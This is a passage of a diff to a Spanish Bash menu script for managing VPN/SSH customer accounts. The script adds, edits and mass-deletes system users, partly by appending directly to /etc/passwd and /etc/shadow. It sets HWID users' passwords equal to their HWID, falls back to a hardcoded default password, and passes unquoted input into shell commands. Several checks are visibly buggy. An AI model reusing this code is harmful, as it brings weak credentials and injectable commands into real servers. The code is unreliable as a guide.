+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+fun_us_hwid
+;;
+4|04)
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+fun_us_tk
+;;
+5)
+[[ ! -e /bin/ejecutar/token ]] && touch /bin/ejecutar/token
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+echo -e "${cor[5]} ⚠️ CLAVE ACTUAL : $(cat < /bin/ejecutar/token) ⚠️${cor[0]}"
+msg -bar
+echo -e "${cor[5]} ⚠️ ATENCION ANTES DE CONTINUAR ⚠️${cor[0]}"
+echo -e ""
+echo -e "   SE DEFINIRA SU CONTRASEÑA TOKEN UNICA"
+echo -e " UNA VEZ COLOCADA SE RECOMIENDA NO CAMBIARLA"
+echo ""
+msg -bar
+echo -ne "${cor[5]} ⎚ CONTRASEÑA "; read -p "TOKEN : " passtok
+echo ${passtok} > /bin/ejecutar/token
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+;;
+*)
+echo -e "${cor[5]} ⚠️ OPCIÓN INVÁLIDA ⚠️${cor[0]}"
+sleep 2
+;;
+esac
+}
+
+fun_us_hwid() {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+
+    [[ ! -e /bin/ejecutar/limFIX ]] && echo "1" > /bin/ejecutar/limFIX
+
+    echo -ne "${cor[5]} ⎚ NOMBRE DE"; read -p " USUARIO : " name
+    [[ -z $name ]] && echo -e "${cor[5]} ⚠️ NO SE REGISTRO NOMBRE, RETORNANDO ⚠️${cor[0]}" && return 
+    echo -e "${cor[5]} INGRESA HWID PARA $name"
+    read -p " HWID: " hwid
+    
+    # Limpiar espacios y validar
+    hwid=$(echo "$hwid" | tr -d '[:space:]')
+    [[ -z "${hwid}" ]] && echo -e "${cor[5]} ⚠️ NO SE INGRESO HWID, RETORNANDO ⚠️${cor[0]}" && return
+
+    # Usar el HWID COMPLETO como nombre de usuario del sistema (soporta 32+ caracteres)
+    local system_user="$hwid"
+
+    if id -u "$system_user" &>/dev/null || grep -q "^${system_user}:" /etc/passwd 2>/dev/null; then
+        echo -e "${cor[5]} ⚠️ HWID YA EXISTE, REGISTRE OTRO ⚠️${cor[0]}"
+        return
+    fi
+
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+
+    msg -bar
+    echo -e "${cor[5]} TIEMPO DE DURACION EN DIAS PARA $name"
+    read -p " VALIDEZ (días, por defecto 1): " daysrnf
+    [[ -z "${daysrnf}" ]] && daysrnf="1"
+    # Solo números
+    daysrnf=$(echo "$daysrnf" | sed 's/[^0-9]//g')
+    [[ -z "$daysrnf" ]] && daysrnf="1"
+    msg -bar
+    meu_ip
+
+    # Fecha de expiración (se suma +1 día como en el código original)
+    valid=$(date '+%C%y-%m-%d' -d " +$((daysrnf + 1)) days")
+    datexp=$(date "+%d/%m/%Y" -d " +$daysrnf days")
+    expira_epoch=""
+    if [[ -n "$daysrnf" ]]; then
+        expira_epoch=$(( $(date +%s) / 86400 + daysrnf + 1 ))
+    fi
+
+    local create_ok=false
+
+    # === CREACIÓN DEL USUARIO ===
+    # Si el HWID es corto (≤32) intentamos useradd normal (más limpio)
+    # Si es largo (>32) usamos el método manual que soporta cualquier longitud
+    if [[ ${#system_user} -le 32 ]]; then
+        if useradd -M -s /bin/false "$system_user" -e "$valid" 2>/dev/null; then
+            (echo "$system_user"; echo "$system_user") | passwd "$system_user" >/dev/null 2>&1
+            create_ok=true
+        fi
+    fi
+
+    # Método manual (para HWIDs largos o si useradd falló)
+    if [[ "$create_ok" != true ]]; then
+        # Buscar UID libre alto (≥ 2000)
+        local uid
+        uid=$(awk -F: '$3>=2000 && $3<60000 {print $3}' /etc/passwd 2>/dev/null | sort -n | tail -1)
+        uid=$(( ${uid:-1999} + 1 ))
+        [[ "$uid" -lt 2000 ]] && uid=2000
+        local gid="$uid"
+
+        # Hash de la contraseña (mismo valor que el HWID)
+        local hash_pass
+        hash_pass=$(openssl passwd -6 "$system_user" 2>/dev/null)
+        if [[ -z "$hash_pass" ]]; then
+            # Fallback si openssl no está o falla
+            hash_pass=$(mkpasswd -m sha-512 "$system_user" 2>/dev/null || echo "")
+        fi
+        if [[ -z "$hash_pass" ]]; then
+            echo -e "${cor[5]} ⚠️ ERROR: no se pudo generar hash de contraseña (instala openssl) ⚠️${cor[0]}"
+            return
+        fi
+
+        # Escribir en group, passwd y shadow (compatible con filtros del menú: home + false)
+        echo "${system_user}:x:${gid}:" >> /etc/group
+        echo "${system_user}:x:${uid}:${gid}::/home/${system_user}:/bin/false" >> /etc/passwd
+
+        local dias_creacion=$(( $(date +%s) / 86400 ))
+        if [[ -n "$expira_epoch" ]]; then
+            echo "${system_user}:${hash_pass}:${dias_creacion}:0:99999:7:::${expira_epoch}" >> /etc/shadow
+        else
+            echo "${system_user}:${hash_pass}:${dias_creacion}:0:99999:7:::" >> /etc/shadow
+        fi
+        chmod 640 /etc/shadow 2>/dev/null
+
+        # Verificar que se creó
+        if id -u "$system_user" &>/dev/null || grep -q "^${system_user}:" /etc/passwd; then
+            create_ok=true
+        fi
+    fi
+
+    if [[ "$create_ok" == true ]]; then
+        # Registrar en usuarios.db (opcional, como el original)
+        echo "$system_user 1" >> /root/usuarios.db 2>/dev/null
+
+        echo -e "${cor[5]} * Puertas Activas en su Servidor *"
+        ports_
+        msg -bar
+        echo -e "${cor[5]} Host/IP-Address : ${cor[4]}$IP"
+        echo -e "${cor[5]} USUARIO : ${cor[4]}$name"
+        echo -e "${cor[5]} HWID    : ${cor[4]}$hwid"
+        echo -e "${cor[5]} VALIDEZ : ${cor[4]}$datexp"
+        echo -e "${cor[5]} DIAS    : ${cor[4]}$daysrnf"
+        msg -bar
+
+        # Guardar datos exactamente como antes (nombre amigable + HWID completo)
+        [[ ! -d "$dir_user" ]] && mkdir -p "$dir_user"
+        echo "senha: $name" > "$dir_user/$system_user"
+        echo "limite: HWID" >> "$dir_user/$system_user"
+        echo "data: $valid" >> "$dir_user/$system_user"
+        echo "hwid_full: $hwid" >> "$dir_user/$system_user"
+    else
+        echo -e "${cor[5]} ⚠️ ERROR AL REGISTRAR SU HWID | REINTENTE ⚠️${cor[0]}"
+    fi
+
+    echo -ne "${cor[2]}"
+    return
+}
+
+
+
+
+
+fun_us_tk() {
+    [[ ! -e /bin/ejecutar/token ]] && {
+        echo -e "${cor[5]} ⚠️ ATENCION ANTES DE CONTINUAR ⚠️${cor[0]}"
+        echo -e ""
+        echo -e "  SE DEFINIRA SU CONTRASEÑA TOKEN UNICA"
+        echo -e " UNA VEZ COLOCADA NO PODRA SER MANIPULADA"
+        echo ""
+        msg -bar
+        echo -ne "${cor[5]} ⎚ CONTRASEÑA "; read -p "TOKEN : " passtok
+        echo ${passtok} > /bin/ejecutar/token
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+    }
+
+    [[ ! -e /bin/ejecutar/limFIX ]] && {
+        echo -e "${cor[5]} ⚠️ ATENCION ANTES DE CONTINUAR ⚠️${cor[0]}"
+        echo -e ""
+        echo -e "  OPCIONAL DEFINE UN LIMITE DE RECONEXIONES"
+        echo -e " ESPECIALES PARA APPS O METODOS INESTABLES!!"
+        echo -e " SINO ENTIENDES LA FUNCION, PRESIONA ENTER!!"
+        echo ""
+        msg -bar
+        echo -ne "${cor[5]} ⎚ DEFINE TU "
+        read -p " LIMITE : "  -e -i "1" _limTP
+        echo ${_limTP} > /bin/ejecutar/limFIX
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+        tput cuu1 && tput dl1
+    }
+
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    echo -ne "${cor[5]} ⎚ NOMBRE DE"; read -p " USUARIO : " name
+    tput cuu1 && tput dl1
+    [[ -z $name ]] && echo -e "${cor[5]} ⚠️ NO REGISTRO NOMBRE, RETORNANDO ⚠️${cor[0]}" && return 
+    msg -bar
+    echo -e "${cor[5]} INGRESA TOKEN PARA $name"
+    read -p " TOKEN: " hwid
+    if cat /etc/passwd | grep $hwid: | grep -vi [a-z]$hwid | grep -v [0-9]$hwid > /dev/null
+    then
+        echo -e "${cor[5]} ⚠️ TOKEN YA EXISTE, REGISTRE OTRO ⚠️${cor[0]}"
+        return
+    fi
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    [[ -z "${hwid}" ]] && echo " ⚠️ No se Ingreso TOKEN, RETORNANDO! ⚠️" && return
+    msg -bar
+    echo -e "${cor[5]} TIEMPO DE DURACION EN DIAS PARA $name"
+    read -p " VALIDEZ : " daysrnf
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    [[ -z "${daysrnf}" ]] && daysrnf="2"
+    msg -bar
+
+    meu_ip
+
+    # Agregamos un día extra solo para la fecha de expiración
+    valid=$(date '+%C%y-%m-%d' -d " +$daysrnf days +1 day")
+    datexp=$(date "+%d/%m/%Y" -d " +$daysrnf days")
+    
+    [[ -e /bin/ejecutar/token ]] && passTOKEN=$(less /bin/ejecutar/token) || passTOKEN="ChumoGHPlus"
+    
+    if useradd -M -s /bin/false $hwid -e $valid ; then
+        (echo $passTOKEN; echo $passTOKEN) | passwd $hwid 2>/dev/null
+        echo "$hwid 1" >> /root/usuarios.db
+        
+        clear && clear
+        echo -e "${cor[5]} * Puertas Activas en su Servidor *"
+        msg -bar
+        ports_
+        msg -bar
+        
+        echo -e "${cor[5]} Host/IP-Address : ${cor[4]}$IP"
+        echo -e "${cor[5]} USUARIO : ${cor[4]}$name"
+        echo -e "${cor[5]} TOKEN   : ${cor[4]}$hwid"
+        echo -e "${cor[5]} VALIDEZ : ${cor[4]}$datexp"
+        echo -e "${cor[5]} DIAS    : ${cor[4]}$daysrnf"
+        msg -bar
+        
+        echo "senha: $name" > $dir_user/$hwid
+        echo "limite: TOKEN" >> $dir_user/$hwid
+        echo "data: $valid" >> $dir_user/$hwid
+        
+    else
+        echo -e "${cor[5]} ⚠️ ERROR AL REGISTRAR SU TOKEN | REINTENTE ⚠️${cor[0]}"
+    fi
+
+    echo -ne "${cor[2]}"
+    return
+}
+
+
+
+function function_1() {
+    echo -e "${cor[4]} ❑ MENU DE CREACION DE USUARIOS ❒ "
+    msg -bar
+    echo -ne "${cor[5]} > NOMBRE DE"; read -p " USUARIO : " name
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    if [ -z "$name" ]; then
+        echo -e "${cor[5]} ⚠️ NO REGISTRO NOMBRE, RETORNANDO ⚠️${cor[0]}"
+        return
+    fi
+    if cat /etc/passwd | grep "$name:" | grep -vi [a-z]$name | grep -v [0-9]$name > /dev/null; then
+        echo -e "${cor[5]} ⚠️ USUARIO YA EXISTE, USE OTRO NOMBRE ⚠️${cor[0]}"
+        return
+    fi
+    msg -bar
+    echo -e "${cor[5]} CONTRASEÑA PARA $name"
+    read -p " CONTRASEÑA : " pass
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    if [[ -f "${pass}" ]]; then
+        pass="$(date | md5sum | head -c10)"
+    fi
+    msg -bar
+    echo -e "${cor[5]} TIEMPO DE DURACION EN DIAS PARA $name"
+    read -p " VALIDEZ : " daysrnf
+    daysrnf=$(echo -e "$daysrnf" | sed -e 's/[^0-9]//ig')
+    number_var "$daysrnf"
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    if [[ -f "${daysrnf}" ]]; then
+        daysrnf="1"  # Valor por defecto si hay error
+    fi
+    msg -bar
+    echo -e "${cor[5]} LIMITE DE CONEXIONES PARA $name"
+    read -p " LIMITE : " limit
+    limit=$(echo -e "$limit" | sed -e 's/[^0-9]//ig')
+    number_var "$limit"
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    if [[ -f "${limit}" ]]; then
+        limit="1"  # Valor por defecto si hay error
+    fi
+    msg -bar
+    meu_ip
+
+    # Calcular la fecha de validez sumando 31 días
+    valid=$(date '+%C%y-%m-%d' -d "+$((daysrnf + 1)) days")  # Sumar 31 días para la expiración
+    datexp=$(date "+%d/%m/%Y" -d "+$((daysrnf + 1)) days")  # Formato de fecha para mostrar
+
+    # Mostrar solo 30 días en la salida
+    valid_show=$(date "+%d/%m/%Y" -d "+${daysrnf} days")  # Solo para mostrar como 30 días
+
+    if useradd -M -s /bin/false "$name" -e "$valid"; then
+        (echo "$pass"; echo "$pass") | passwd "$name" >/dev/null 2>&1 &
+        echo "$name $limit" >> /root/usuarios.db
+        tput cuu1 >&2 && tput dl1 >&2
+        echo -e "${cor[5]} * Puertas Activas en su Servidor *"
+        msg -bar
+        ports_
+        msg -bar
+        echo -e "${cor[5]} Host/IP-Address : ${cor[4]}$IP"
+        echo -e "${cor[5]} USUARIO : ${cor[4]}$name"
+        echo -e "${cor[5]} PASSWD  : ${cor[4]}$pass"
+        echo -e "${cor[5]} LIMITE  : ${cor[4]}$limit"
+        echo -e "${cor[5]} VALIDEZ : ${cor[4]}$valid_show"  # Mostrar solo 30 días
+        echo -e "${cor[5]} DIAS    : ${cor[4]}$daysrnf"  # Mostrar solo los días ingresados
+        echo -e "${cor[5]} HTTP CUSTOM ➡️ @${name}:${pass}"
+
+        msg -bar
+        echo "senha: $pass" > "$dir_user/$name"
+        echo "limite: $limit" >> "$dir_user/$name"
+        echo "data: $valid" >> "$dir_user/$name"
+    else
+        echo -e "${cor[5]} ⚠️ ERROR AL REGISTRAR SU USUARIO | REINTENTE ⚠️${cor[0]}"
+    fi
+    echo -ne "${cor[2]}"
+    return
+}
+
+
+
+
+
+
+function_2 () {
+# Limpieza de pantalla (reemplaza los múltiples tput por algo más limpio si prefieres)
+clear
+msg -bar
+echo -e "${cor[4]} ELIMINAR USUARIOS"
+msg -bar
+echo -e "\033[0;35m [\033[0;36m1\033[0;35m]\033[0;33m >${cor[3]} ELIMINAR 1 USER"
+echo -e "\033[0;35m [\033[0;36m2\033[0;35m]\033[0;33m >${cor[3]} ELIMINAR TODOS (SIN PREGUNTAR)"
+echo -e "\033[0;35m [\033[0;36m3\033[0;35m]\033[0;33m >${cor[3]} ELIMINAR TODOS LOS CADUCADOS"
+msg -bar
+selection=$(selection_fun 3)
+
+case ${selection} in
+0) return ;;
+1)
+    unset select_name namer nameFX
+    select_users 'USUARIOS REGISTRADOS'
+    name="$select_name"
+    [[ -z $name ]] && return
+    
+    # Lógica de detección de nombre/HWID/TOKEN
+    [[ $(cat /etc/adm-lite/userDIR/$name 2>/dev/null | grep "limite" | awk '{print $2}') = "HWID" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$name 2>/dev/null | grep "senha" | awk '{print $2}')" || nameFX=$name
+    [[ $(cat /etc/adm-lite/userDIR/$name 2>/dev/null | grep "limite" | awk '{print $2}') = "TOKEN" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$name 2>/dev/null | grep "senha" | awk '{print $2}')" || nameFX=$name
+    
+    [[ "$OPENVPN" = "on" ]] && open_2 $name && msg -bar && return 
+
+    # CAPA 1 — mata todos los procesos del usuario de golpe
+    pkill -u $name &>/dev/null
+
+    # CAPA 2 — mata procesos Dropbear específicos del usuario
+    droplim=$(dropbear_pids | grep -w "$name" | awk '{print $2}')
+    kill -9 $droplim &>/dev/null
+
+    # CAPA 3 — elimina el usuario y su config
+    userdel --force $name > /dev/null 2>/dev/null
+    rm -f /etc/adm-lite/userDIR/$name
+
+    # CAPA 4 — segunda pasada quirúrgica sobre cualquier proceso residual
+    kill -9 $(ps aux | grep -v grep | grep -v "[a-z]$name" | grep -v "$name[a-z]" | grep "$name" | awk '{print $2}') 2>/dev/null
+    
+    echo -e " $nameFX ${cor[2]} ELIMINADO "
+    msg -bar
+    return
+    ;;
+2)
+    # ELIMINACIÓN MASIVA SIN PREGUNTAS
+    echo -e "${cor[5]} INICIANDO ELIMINACIÓN MASIVA..."
+    for name in $(cat "/etc/passwd" | grep 'home' | grep 'false' | grep -v 'syslog' | cut -d: -f1 | sort); do
+        if [ "$OPENVPN" = "on" ]; then
+            open_2 $name
+        else
+            userdel --force $name > /dev/null 2>&1
+            # Matar procesos del usuario
+            kill -9 $(ps aux | grep -v grep | grep "$name" | awk '{print $2}') > /dev/null 2>&1
+            
+            # Limpieza de archivos de registro y Dropbear
+            [[ -e /etc/adm-lite/userDIR/$name ]] && rm /etc/adm-lite/userDIR/$name
+            [[ -e /etc/usuariosteste/$name ]] && rm /etc/usuariosteste/$name
+            
+            echo -e "\033[1;37m Usuario: $name --- ${cor[5]}ELIMINADO"
         fi
     done
     msg -bar
-    read -p " Enter para Continuar"
-}
-
-borrar_usuario () {
-    valid_fun
-    echo -ne "\033[1;33m USUARIO A BORRAR : \033[0m" && read u
-    [[ "$(verif_usr $u)" -eq 0 ]] && { msg -verm "NO EXISTE"; return; }
-    userdel -r "$u" 2>/dev/null
-    msg -verd " USUARIO $u ELIMINADO"
-    sleep 2
-}
-
-cambiar_password () {
-    valid_fun
-    echo -ne "\033[1;33m USUARIO : \033[0m" && read u
-    echo -ne "\033[1;33m NUEVO PASSWORD : \033[0m" && read p
-    echo -e "$p\n$p\n" | passwd "$u" 2>/dev/null
-    msg -verd "CONTRASEÑA CAMBIADA"
-    sleep 2
-}
-
-monitor_conexiones () {
-    valid_fun
-    echo -e "\033[1;32m CONEXIONES ACTIVAS"
+    echo -e "${cor[2]} PROCESO COMPLETADO"
     msg -bar
-    who 2>/dev/null
-    msg -bar
-    read -p " Enter para Continuar"
+    ;;
+3)
+    function_6
+    return
+    ;;
+esac
 }
 
+
+function_3 () {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+msg -bar
+echo -e "${cor[4]} "
+msg -bar
+unset select_name namer nameFX
+select_users 'MODIFICAR DATOS DE USUARIOS'
+if [ "$select_name" = "" ]; then
+return
+fi
+namer="$select_name"
+[[ $(cat /etc/adm-lite/userDIR/$namer | grep "limite" | awk '{print $2}') = "HWID" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$u | grep "senha" | awk '{print $2}')" || nameFX=$namer
+[[ $(cat /etc/adm-lite/userDIR/$namer | grep "limite" | awk '{print $2}') = "TOKEN" ]] && nameFX="$(cat /etc/adm-lite/userDIR/$u | grep "senha" | awk '{print $2}')" || nameFX=$namer
+meu_ip
+echo -e "${cor[5]} ESCOJE LA OPCION A CAMBIAR DE $namer"
+msg -bar
+echo -e "\033[0;35m [\033[0;36m1\033[0;35m]\033[0;31m >${cor[3]} NUMERO DE LOGINS DE    \033[0;36m$nameFX"
+echo -e "\033[0;35m [\033[0;36m2\033[0;35m]\033[0;31m >${cor[3]} FECHA DE EXPIRACION DE \033[0;36m$nameFX"
+echo -e "\033[0;35m [\033[0;36m3\033[0;35m]\033[0;31m >${cor[3]} CONTRASEÑA LOGIN DE    \033[0;36m$nameFX"
+echo -e "\033[0;35m [\033[0;36m4\033[0;35m]\033[0;31m >${cor[3]} EDITAR HWID DE         \033[0;36m$nameFX" # <-- LÍNEA NUEVA
+msg -bar
+read -p " SELECCIONA UNA OPC : " _opt
+[[ "$_opt" = "1" ]] && {
+    clear
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+read -p " NUEVO LIMITE DE CONEXIONES : " new_limit
+number_var $new_limit
+tput cuu1 && tput dl1
+ if [ "$new_limit" = "" ]; then
+echo -e "${cor[5]} \033[1;31m NO SE REGISTRO LIMITE! REGRESANDO. . ."
+return
+ fi
+usr_var=$(cat $dir_user/$namer | grep -v "limite:")
+echo "$usr_var" > $dir_user/$namer
+echo "limite: $new_limit" >> $dir_user/$namer
+msg -bar
+echo -e "${cor[5]} $select_user - $select_name"
+echo -e " ✭ Perfecto, HEMOS CAMBIADO SU LIMITE DE CONEXIONES!! ✭ "
+echo -e " RENOVADO EL  : $(date "+%d/%m/%Y") "
+echo -e " Host / IP    : ${cor[4]}$IP"
+echo -e " SU CLIENTE   : $nameFX " 
+echo -e " NUEVO LIMITE : $new_limit " 
+pkill -u $nameFX
+msg -bar
+unset new_limit
+unset usr_var
+return
+}
+[[ "$_opt" = "4" ]] && {
+    clear
+    # Limpiar la pantalla para una mejor interfaz
+    for i in {1..7}; do tput cuu1 && tput dl1; done
+
+    # 1. Verificar si el usuario es de tipo HWID
+    local user_type=$(grep "limite:" "$dir_user/$namer" | awk '{print $2}')
+    if [ "$user_type" != "HWID" ]; then
+        echo -e "${cor[5]} ⚠️ El usuario seleccionado no es de tipo HWID. ⚠️${cor[0]}"
+        msg -bar
+        return
+    fi
+
+    # 2. Obtener datos del usuario antiguo
+    local old_hwid_user="$namer"
+    local friendly_name=$(grep "senha:" "$dir_user/$old_hwid_user" | awk '{print $2}')
+    local expiration_date=$(grep "data:" "$dir_user/$old_hwid_user" | awk '{print $2}')
+    local old_full_hwid=$(grep "hwid_full:" "$dir_user/$old_hwid_user" | awk '{print $2}')
+
+    echo -e "${cor[5]} Editando HWID para el usuario: \033[1;36m$friendly_name\033[0m"
+    echo -e "${cor[3]} HWID Actual: $old_full_hwid"
+    msg -bar
+
+    # 3. Solicitar el nuevo HWID
+    read -p " Ingrese el nuevo HWID: " new_hwid
+    new_hwid=$(echo "$new_hwid" | tr -d '[:space:]')
+    if [[ -z "$new_hwid" ]]; then
+        echo -e "${cor[5]} ⚠️ No se ingresó un nuevo HWID. Operación cancelada. ⚠️${cor[0]}"
+        return
+    fi
+
+    # Usar HWID completo (soporta 32+ caracteres)
+    local new_hwid_user="$new_hwid"
+
+    # 4. Validar que el nuevo HWID no exista en el sistema
+    if id -u "$new_hwid_user" >/dev/null 2>&1 || grep -q "^${new_hwid_user}:" /etc/passwd 2>/dev/null; then
+        echo -e "${cor[5]} ⚠️ ¡Error! Ya existe un usuario en el sistema con ese HWID. ⚠️${cor[0]}"
+        return
+    fi
+
+    local create_ok=false
+
+    # Intentar useradd si es corto (≤32)
+    if [[ ${#new_hwid_user} -le 32 ]]; then
+        if useradd -M -s /bin/false "$new_hwid_user" -e "$expiration_date" 2>/dev/null; then
+            (echo "$new_hwid_user"; echo "$new_hwid_user") | passwd "$new_hwid_user" >/dev/null 2>&1
+            create_ok=true
+        fi
+    fi
+
+    # Método manual para HWIDs largos o si useradd falló
+    if [[ "$create_ok" != true ]]; then
+        local uid
+        uid=$(awk -F: '$3>=2000 && $3<60000 {print $3}' /etc/passwd 2>/dev/null | sort -n | tail -1)
+        uid=$(( ${uid:-1999} + 1 ))
+        [[ "$uid" -lt 2000 ]] && uid=2000
+        local gid="$uid"
+
+        local hash_pass
+        hash_pass=$(openssl passwd -6 "$new_hwid_user" 2>/dev/null)
+        [[ -z "$hash_pass" ]] && hash_pass=$(mkpasswd -m sha-512 "$new_hwid_user" 2>/dev/null || echo "")
+        if [[ -z "$hash_pass" ]]; then
+            echo -e "${cor[5]} ⚠️ ERROR: no se pudo generar hash de contraseña ⚠️${cor[0]}"
+            return
+        fi
+
+        # Calcular expire epoch desde la fecha de expiración
+        local expira_epoch=""
+        if [[ -n "$expiration_date" ]]; then
+            expira_epoch=$(date -d "$expiration_date" +%s 2>/dev/null)
+            [[ -n "$expira_epoch" ]] && expira_epoch=$(( expira_epoch / 86400 ))
+        fi
+
+        echo "${new_hwid_user}:x:${gid}:" >> /etc/group
+        echo "${new_hwid_user}:x:${uid}:${gid}::/home/${new_hwid_user}:/bin/false" >> /etc/passwd
+
+        local dias_creacion=$(( $(date +%s) / 86400 ))
+        if [[ -n "$expira_epoch" ]]; then
+            echo "${new_hwid_user}:${hash_pass}:${dias_creacion}:0:99999:7:::${expira_epoch}" >> /etc/shadow
+        else
+            echo "${new_hwid_user}:${hash_pass}:${dias_creacion}:0:99999:7:::" >> /etc/shadow
+        fi
+        chmod 640 /etc/shadow 2>/dev/null
+
+        if id -u "$new_hwid_user" &>/dev/null || grep -q "^${new_hwid_user}:" /etc/passwd; then
+            create_ok=true
+        fi
+    fi
+
+    if [[ "$create_ok" == true ]]; then
+        # Crear el nuevo archivo de configuración del usuario
+        echo "senha: $friendly_name" > "$dir_user/$new_hwid_user"
+        echo "limite: HWID" >> "$dir_user/$new_hwid_user"
+        echo "data: $expiration_date" >> "$dir_user/$new_hwid_user"
+        echo "hwid_full: $new_hwid" >> "$dir_user/$new_hwid_user"
+
+        # 6. Eliminar el usuario antiguo
+        userdel --force "$old_hwid_user" >/dev/null 2>&1
+        # Limpieza extra por si fue creado manualmente
+        sed -i "/^${old_hwid_user}:/d" /etc/passwd /etc/shadow /etc/group 2>/dev/null
+        rm -f "$dir_user/$old_hwid_user"
+
+        # 7. Mostrar mensaje de éxito
+        msg -bar
+        echo -e " ✅ \033[1;32m¡HWID actualizado con éxito!\033[0m ✅"
+        msg -bar
+        echo -e "${cor[5]} Usuario    : ${cor[4]}$friendly_name"
+        echo -e "${cor[5]} Nuevo HWID : ${cor[4]}$new_hwid"
+        echo -e "${cor[5]} Expira el  : ${cor[4]}$(date -d "$expiration_date - 1 day" "+%d/%m/%Y" 2>/dev/null || echo "$expiration_date")"
+        msg -bar
+    else
+        echo -e "${cor[5]} ⚠️ Error al crear el nuevo usuario del sistema. ⚠️${cor[0]}"
+    fi
+    return
+}
+
+[[ "$_opt" = "2" ]] && {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+add_dias() {
+    clear
+    echo -ne "${cor[5]} INGRESE NÚMERO DE DÍAS A AGREGAR"
+    read -p " : " dias_a_agregar
+    tput cuu1 && tput dl1
+
+    if [[ ! "$dias_a_agregar" =~ ^[0-9]+$ ]]; then
+        echo -e "\033[1;31m ⚠️ ¡Debe ingresar un número válido de días! ⚠️"
+        return
+    fi
+
+    local data_user=$(chage -l "$namer" | grep -i co | awk -F ":" '{print $2}' | xargs)
+
+    if [ -z "$data_user" ]; then
+        echo -e "\033[1;31m ⚠️ ¡No se pudo obtener la fecha de expiración! ⚠️"
+        return
+    fi
+
+    local data_user_yyyymmdd=$(date -d "$data_user" +%Y-%m-%d)
+    local exp_seconds=$(date -d "$data_user_yyyymmdd" +%s)
+    local today_seconds=$(date -d "$(date +%Y-%m-%d)" +%s)
+    local base_date_str
+    local dias_calculo=$dias_a_agregar
+
+    # --- LÓGICA MEJORADA ---
+    if (( exp_seconds <= today_seconds )); then
+        # Usuario expirado: sumar desde hoy
+        base_date_str=$(date +%Y-%m-%d)
+        dias_calculo=$((dias_a_agregar + 1))
+    else
+        # Usuario activo: base de cálculo es la fecha actual de expiración
+        base_date_str=$data_user_yyyymmdd
+        dias_calculo=$dias_a_agregar
+    fi
+
+    local nueva_fecha_valida=$(date '+%Y-%m-%d' -d "$base_date_str + $dias_calculo days")
+    if [ $? -ne 0 ]; then
+        echo -e "\033[1;31m ⚠️ ¡No se pudo calcular la nueva fecha de expiración! ⚠️"
+        return
+    fi
+
+    local fecha_valido_hasta=$(date "+%d/%m/%Y" -d "$nueva_fecha_valida -1 day")
+    local limite=$(awk '/limite/ {print $2}' "$dir_user/$namer")
+    [ -z "$limite" ] && limite="null"
+
+    if [[ $(passwd --status $namer | cut -d ' ' -f2) = "L" ]]; then
+        usermod -U "$namer"
+        msg -verd " ⚠️ Usuario desbloqueado ⚠️"
+    fi
+
+    chage -E "$nueva_fecha_valida" "$namer" 2>/dev/null
+    if [ $? -ne 0 ]; then
+        echo -e "\033[1;31m ⚠️ ¡No se pudo actualizar la fecha de expiración! ⚠️"
+        return
+    fi
+
+    echo -e "$(awk '/^data/ {next} 1' "$dir_user/$namer")" > "$dir_user/$namer"
